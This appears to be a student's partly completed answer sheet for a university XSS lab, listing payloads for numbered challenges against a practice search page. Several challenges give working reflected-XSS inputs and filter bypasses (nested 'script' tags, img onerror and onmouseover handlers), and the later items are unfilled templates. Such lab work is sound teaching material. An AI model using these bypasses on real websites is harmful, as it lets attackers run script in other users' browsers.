# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
The website had reflected XSS vulnerability. It was embedding URL parameter to the document.

Enter <script>success()</script> to the search input.
```

# 2. No Script Allowed (3 points)

```
Replace regex was not looking for all 'script' words inside the query, it was only replacing the first one.

Enter <scriptscript>success()</script> to the search input.
```

# 3. One More Time, Like You Mean It (3 points)

```
Replace regex now replaces 'script' words in all of the input text. But <script> is not the only way to execute JavaScript.

Enter <img src="" onerror="success()"> to the search input.
```

# 4. An Open-and-Shut Case (3 points)

```
The previous input (<img src="" onerror="success()">) also works on this case, because they only look at 'script' words.
```

# 5. Time to Mix Things Up (3 points)

```
The previous input (<img src="" onerror="success()">) also works on this case, because they only look at 'script' or 'SCRIPT' words.
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
Again <img src="" onerror="success()">.
```

# 7. Between a Rock And a Hard Place (3 points)

```
This requires user interaction but we can use 'mouseover' event to achieve this result.

Enter <h1 onmouseover="success()">Nice text!</h1> to the search input.
```

# 8. Angle of Death (6 points)

Attack input:

```
When entering <script>success()</script> the website displays 'scriptsuccess()</script>'.
I am assuming they replace the first script tag and also < and > symbols.

Enter <<script>>success()</script> to the search input.
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
Looks like they add the query to alt attribute of the image tag. <img src="..." alt="Search for {query}">.
We can close the alt attribute and the image, then create a new tag for ourselves.
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
TODO: Replace this with your attack input.
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
TODO: Replace this with your attack input.
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
TODO: Replace this with your solution. **This should be a URL!**
```

# 15. The Early Bird Catches the Worm (3 points)

```
TODO: Replace this with your attack input.
```

# 16. Tying Up Loose Ends (3 points)

```
TODO: Replace this with your attack input.
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
// TODO: Replace this with your solution.
```

# 18. Congrats

N/A

# Survey responses (3 points)

Write your survey responses in SURVEY.md!
